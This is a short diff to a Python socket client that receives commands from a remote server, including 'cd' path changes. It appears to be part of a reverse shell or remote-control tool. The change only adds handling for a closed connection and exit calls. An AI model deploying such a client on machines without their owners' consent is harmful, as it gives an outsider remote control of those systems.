@@ -27,8 +27,11 @@ class Client:
         self.socket.connect((self.host, self.port))
 
     def communicate_with_server(self):
-        while True:
+        is_alive = True
+        while is_alive:
             data = self.socket.recv(65535)
+            if len(data) == 0:
+                is_alive = False
             if data[:2].decode("utf-8") == "cd":
                 decoded_data = data[3:].decode("utf-8")
                 decoded_path = os.path.expanduser(decoded_data)
@@ -43,10 +46,14 @@ class Client:
 
     def kill_connection(self):
         self.socket.close()
+        sys.exit()
 
 def Main(_host, _port):
     client = Client(_host, _port)
     client.communicate_with_server()
+
+    client.kill_connection()
+    sys.exit()
 
 
 if __name__ == '__main__':
